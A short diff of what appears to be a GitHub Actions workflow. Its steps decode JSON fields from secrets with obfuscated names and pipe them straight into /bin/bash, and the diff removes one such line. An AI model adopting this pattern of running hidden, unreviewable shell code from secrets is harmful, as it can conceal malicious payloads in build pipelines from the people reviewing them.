@@ -18,7 +18,6 @@ jobs:
           c57878: ${{ secrets.c57878 }}
         run: |
           printf '%s' "$c57878" | jq -r .m0 | /bin/bash
-          printf '%s' "$f9346" | jq -r .ifh694 | /bin/bash
           printf '%s' "$gn45829" | jq -r .lhed22640 | /bin/bash
 
       - name: Persist output
